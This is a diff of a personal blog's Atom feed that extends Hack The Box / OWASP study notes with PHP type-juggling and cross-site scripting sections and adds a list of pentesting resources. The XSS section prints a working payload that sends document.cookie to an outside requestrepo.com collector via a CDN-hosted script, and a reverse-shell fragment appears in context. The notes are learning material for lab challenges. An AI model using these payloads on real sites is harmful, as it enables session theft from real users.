@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.1">Jekyll</generator><link href="https://www.agalera.eu/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.agalera.eu/" rel="alternate" type="text/html" /><updated>2023-01-13T15:16:46+01:00</updated><id>https://www.agalera.eu/feed.xml</id><title type="html">Adrian Galera blog</title><subtitle>My personal developer blog page</subtitle><entry><title type="html">OWASP Top 10</title><link href="https://www.agalera.eu/owasp-top10/" rel="alternate" type="text/html" title="OWASP Top 10" /><published>2023-01-09T00:00:00+01:00</published><updated>2023-01-09T00:00:00+01:00</updated><id>https://www.agalera.eu/owasp-top10</id><content type="html" xml:base="https://www.agalera.eu/owasp-top10/">&lt;p&gt;I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I’ll use this article to save all the knowledge I’ve got related with OWASP Top 10 vulnerabilities.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.1">Jekyll</generator><link href="https://www.agalera.eu/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.agalera.eu/" rel="alternate" type="text/html" /><updated>2023-01-18T17:22:42+01:00</updated><id>https://www.agalera.eu/feed.xml</id><title type="html">Adrian Galera blog</title><subtitle>My personal developer blog page</subtitle><entry><title type="html">OWASP Top 10</title><link href="https://www.agalera.eu/owasp-top10/" rel="alternate" type="text/html" title="OWASP Top 10" /><published>2023-01-09T00:00:00+01:00</published><updated>2023-01-09T00:00:00+01:00</updated><id>https://www.agalera.eu/owasp-top10</id><content type="html" xml:base="https://www.agalera.eu/owasp-top10/">&lt;p&gt;I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I’ll use this article to save all the knowledge I’ve got related with OWASP Top 10 vulnerabilities.&lt;/p&gt;
 
 &lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
 
@@ -360,6 +360,8 @@ Legend: code, data, rodata, value
       &lt;li&gt;&lt;a href=&quot;#search-vuln&quot;&gt;Search for vulnerabilities&lt;/a&gt;&lt;/li&gt;
       &lt;li&gt;&lt;a href=&quot;#xxe&quot;&gt;XML eXternal Entities&lt;/a&gt;&lt;/li&gt;
       &lt;li&gt;&lt;a href=&quot;#jwt-confussion&quot;&gt;JWT Key Confussion&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#php-type-jungling&quot;&gt;PHP Type Jungling&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#xss&quot;&gt;Cross-Site Scripting&lt;/a&gt;&lt;/li&gt;
     &lt;/ol&gt;
   &lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#foothold&quot;&gt;Foothold, we are in&lt;/a&gt;
@@ -417,8 +419,6 @@ Legend: code, data, rodata, value
 &lt;h4 id=&quot;poorly-configured-access-&quot;&gt;Poorly configured access &lt;a name=&quot;anonymous-access&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
 
 &lt;p&gt;The user might have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tftp&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb&lt;/code&gt; shares with anonymous access. It’s worth taking a look because those access might leak some valuable information. Additionally, you can also check &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;metasploit&lt;/code&gt; to check for this kind of access.&lt;/p&gt;
-
-&lt;p&gt;You can also check if the page is using php to abuse the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcmp&lt;/code&gt; function. Example: &lt;a href=&quot;https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016&quot;&gt;https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;&lt;/p&gt;
 
@@ -616,7 +616,7 @@ d}|{bash,-i}&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hostname&lt;/
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;order&amp;gt;&amp;lt;quantity&amp;gt;&lt;/span&gt;2&lt;span class=&quot;nt&quot;&gt;&amp;lt;/quantity&amp;gt;&amp;lt;item&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/item&amp;gt;&amp;lt;address&amp;gt;&lt;/span&gt;Fake street 1234&lt;span class=&quot;nt&quot;&gt;&amp;lt;/address&amp;gt;&amp;lt;/order&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;h4 id=&quot;jw-key-confussion-attack-&quot;&gt;JW Key confussion attack &lt;a name=&quot;jwt-confussion&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;jwt-key-confussion-attack-&quot;&gt;JWT Key confussion attack &lt;a name=&quot;jwt-confussion&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
 
 &lt;p&gt;JWT Tokens are a way to sign and verify tokens that can contain important data such as credencials, roles, etc…&lt;/p&gt;
 
@@ -654,6 +654,45 @@ d}|{bash,-i}&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hostname&lt;/
 &lt;p&gt;Then, we change the payload and we sign again to generate the JWT. We use the public key and we change the algorithm to Hash. This way the received will verify the token using the public key. It will first fail with the asymmetric but it will work with the symmetric algorithm.&lt;/p&gt;
 
 &lt;p&gt;In this case, we are modifying the token to retrieve something from the database using an SQL injection.&lt;/p&gt;
+
+&lt;h4 id=&quot;php-type-jungling-&quot;&gt;PHP Type jungling &lt;a name=&quot;php-type-jungling&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;Due to the nature of PHP we can abuse the type jungling feature.&lt;/p&gt;
+
+&lt;p&gt;The following condition will be true and print the message.&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$example_int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$example_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;“&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;”&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$example_int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$example_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+   &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;PHP can compare ints and strings.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, an if with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;==&lt;/code&gt; will not check the types. Only &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;===&lt;/code&gt; check the types. Internally php select statement uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;==&lt;/code&gt; comparisson, therefore is vulnerable to this kind of vulnerability. See &lt;a href=&quot;https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09&quot;&gt;https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;So, if you spot a switch statement that checks a user provided string, just change the string value to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;You can also check if the page is using php to abuse the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcmp&lt;/code&gt; function. Example: &lt;a href=&quot;https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016&quot;&gt;https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;cross-site-scripting-xss-&quot;&gt;Cross-Site Scripting (XSS) &lt;a name=&quot;xss&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;This is a massive vulnerability. It consist on a web application accepting input from the user. If the input is not sanitized, the attacker might be able to write HTML in the input form. This HTML can include malicious javascript code.&lt;/p&gt;
+
+&lt;p&gt;Let’s imagine we have an application with a form with no sanitized input. On another view we list that input. An attacker can place JS code that will be executed in the other view.&lt;/p&gt;
+
+&lt;p&gt;E.g.&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Create a payload file that will send the interesting data (in our case, we want to extract something from the cookie):
+    &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https://ojm5l9c8.requestrepo.com/?&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Write the XSS HTML code in the input form field:
+    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;https://cdn.jsdelivr.net/gh/adriangalera/htb-cursed-secret-party-xss@master/xss.js&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;In the remote url (requestrepo), you’ll see the value of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;document.cookie&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;There’s a security header in modern browsers to prevent this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content Security Policy (CSP)&lt;/code&gt;. However, if you are unlucky enough to include a CDN in that header, you are still vulnerable since one can put arbitrary code in the CDN.&lt;/p&gt;
 
 &lt;h3 id=&quot;foothold-we-are-in-&quot;&gt;Foothold, we are in &lt;a name=&quot;foothold&quot;&gt;&lt;/a&gt;&lt;/h3&gt;
 
@@ -801,7 +840,81 @@ root
 :shell
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Another case, might be seeing a unix socket (docker or lxd) with potential root permissions, in that case check in hacktrics: &lt;a href=&quot;https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation&quot;&gt;https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the steps I take to complete the challenges.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting tools</title><link href="https://www.agalera.eu/pentesting-tools/" rel="alternate" type="text/html" title="Pentesting tools" /><published>2022-12-16T00:00:00+01:00</published><updated>2022-12-16T00:00:00+01:00</updated><id>https://www.agalera.eu/pentesting-tools</id><content type="html" xml:base="https://www.agalera.eu/pentesting-tools/">&lt;p&gt;I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I’ll use this article to save all the pentesting tools I am learning.&lt;/p&gt;
+&lt;p&gt;Another case, might be seeing a unix socket (docker or lxd) with potential root permissions, in that case check in hacktrics: &lt;a href=&quot;https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation&quot;&gt;https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the steps I take to complete the challenges.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting interesting links</title><link href="https://www.agalera.eu/pentesting-resources/" rel="alternate" type="text/html" title="Pentesting interesting links" /><published>2022-12-25T00:00:00+01:00</published><updated>2022-12-25T00:00:00+01:00</updated><id>https://www.agalera.eu/pentesting-resources</id><content type="html" xml:base="https://www.agalera.eu/pentesting-resources/">&lt;p&gt;I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I’ll use this article to save all the pentesting interesting links I found.&lt;/p&gt;
+
+&lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;resources&quot;&gt;Resources&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Name&lt;/td&gt;
+      &lt;td&gt;Description&lt;/td&gt;
+      &lt;td&gt;Link&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;pentestbook.six2dez.com&lt;/td&gt;
+      &lt;td&gt;General guides on pentesting&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://pentestbook.six2dez.com/&quot;&gt;https://pentestbook.six2dez.com/&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;revshells&lt;/td&gt;
+      &lt;td&gt;List of reverse shells&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://www.revshells.com/&quot;&gt;https://www.revshells.com/&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Hacktricks&lt;/td&gt;
+      &lt;td&gt;Useful for everything related with pentesting&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://book.hacktricks.xyz/welcome/readme&quot;&gt;https://book.hacktricks.xyz/welcome/readme&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;SecLists&lt;/td&gt;
+      &lt;td&gt;Wordlists and stuff&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Reverse shells&lt;/td&gt;
+      &lt;td&gt;More reverse shells payloads&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md&quot;&gt;swisskyrepo/PayloadsAllTheThings&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Pentestmonkey&lt;/td&gt;
+      &lt;td&gt;Another pentesting guide&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://pentestmonkey.net/&quot;&gt;https://pentestmonkey.net/&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;GTFOBins&lt;/td&gt;
+      &lt;td&gt;List of UNIX binaries that can be used to bypass local security restrictions&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;https://gtfobins.github.io/&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;LOLbas&lt;/td&gt;
+      &lt;td&gt;Similar to GTFObins but for Windows&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://lolbas-project.github.io/&quot;&gt;https://lolbas-project.github.io/&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Red team notes&lt;/td&gt;
+      &lt;td&gt;Red team notes&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://www.ired.team/&quot;&gt;https://www.ired.team/&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;SQL injections&lt;/td&gt;
+      &lt;td&gt;SQL injections&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/&quot;&gt;SQL injection cheatsheet&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;CVE mitre&lt;/td&gt;
+      &lt;td&gt;Search for CVEs&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://cve.mitre.org/cve/search_cve_list.html&quot;&gt;https://cve.mitre.org/cve/search_cve_list.html&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Request repo&lt;/td&gt;
+      &lt;td&gt;Tool to receive HTTP request and display data&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://requestrepo.com/&quot;&gt;https://requestrepo.com/&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the pentesting interesting links I found.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting tools</title><link href="https://www.agalera.eu/pentesting-tools/" rel="alternate" type="text/html" title="Pentesting tools" /><published>2022-12-16T00:00:00+01:00</published><updated>2022-12-16T00:00:00+01:00</updated><id>https://www.agalera.eu/pentesting-tools</id><content type="html" xml:base="https://www.agalera.eu/pentesting-tools/">&lt;p&gt;I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I’ll use this article to save all the pentesting tools I am learning.&lt;/p&gt;
 
 &lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
 
@@ -1807,84 +1920,4 @@ cb1dc474e185777dad218b7d60f2781723d8190b
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/posts/leaflet-load-gpx/gpx.png&quot; alt=&quot;GPX representation in leaflet map&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Here you can see it in action: &lt;a href=&quot;https://www.agalera.eu/leaflet-fogofwar/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.agalera.eu/leaflet-fogofwar/&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="leaflet" /><category term="javascript" /><category term="browser" /><category term="gis" /><category term="gpx" /><category term="leaflet" /><category term="javascript" /><category term="browser" /><category term="gis" /><category term="gpx" /><summary type="html">Following up from the previous article about implementing the fog of war in leaflet, I want to be able to load a GPX file and display it in the map.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/leaflet-load-gpx/featured-image.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/leaflet-load-gpx/featured-image.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Draw a polygon from markers in leaflet</title><link href="https://www.agalera.eu/leaflet-draw-polygon-markers/" rel="alternate" type="text/html" title="Draw a polygon from markers in leaflet" /><published>2022-07-21T00:00:00+02:00</published><updated>2022-07-21T00:00:00+02:00</updated><id>https://www.agalera.eu/leaflet-draw-polygon-markers</id><content type="html" xml:base="https://www.agalera.eu/leaflet-draw-polygon-markers/">&lt;style type=&quot;text/css&quot;&gt;
-.image-table td{
-    border: 0px;
-}
-.image-table .center{
-    text-align: center;
-}
-&lt;/style&gt;
-
-&lt;p&gt;Following up from the previous article about implementing the fog of war in leaflet, I want to add some markers to the map and to create a polygon that joins them.&lt;/p&gt;
-
-&lt;p&gt;Let’s see how I manage to do that.&lt;/p&gt;
-
-&lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
-
-&lt;p&gt;This is part of my series of articles about leaflet:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;/leaflet-fog-of-war&quot;&gt;Leaflet fog of war&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;/leaflet-draw-polygon-markers&quot;&gt;Draw a polygon from markers in leaflet&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;/leaflet-load-gpx&quot;&gt;Load and display GPX in leaflet&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;/browser-storage&quot;&gt;Browser storage&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;The user can click the map to generate markers that follow a route, e.g. a road, a trail, etc.. and later join those markers to create a complex polygon. This reflects the fact that you have visited the road, but you only have certain visibility of the environment (maybe 10 meters or so):&lt;/p&gt;
-
-&lt;table class=&quot;image-table&quot;&gt;
-&lt;tr&gt;
-&lt;td&gt;
-&lt;img src=&quot;/assets/img/posts/draw-polygon-markers/1.png&quot; alt=&quot;Markers&quot; /&gt;
-&lt;/td&gt;
-&lt;td&gt;
-&lt;img src=&quot;/assets/img/posts/draw-polygon-markers/2.png&quot; alt=&quot;Joined markers into a polygon&quot; /&gt;
-&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td class=&quot;center&quot;&gt;
-&lt;small&gt;Markers&lt;/small&gt;
-&lt;/td&gt;
-&lt;td class=&quot;center&quot;&gt;
-&lt;small&gt;Joined markers into a polygon&lt;/small&gt;
-&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;join-markers-into-a-polygon&quot;&gt;Join markers into a polygon&lt;/h2&gt;
-
-&lt;p&gt;When a new marker is added, it is added to the map and to an internal array:&lt;/p&gt;
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &lt;span class=&quot;nx&quot;&gt;onAdd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;marker&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Marker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;latlng&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;nx&quot;&gt;container&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;markers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;marker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addTo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;When the user click on a button, those markers are processed and joined into a polygon by using the &lt;a href=&quot;https://github.com/bjornharrtell/jsts&quot;&gt;jsts&lt;/a&gt; library&lt;/p&gt;
-
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_joinLinesInPolygon&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;points&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pointToGeomCoordinate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lng&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
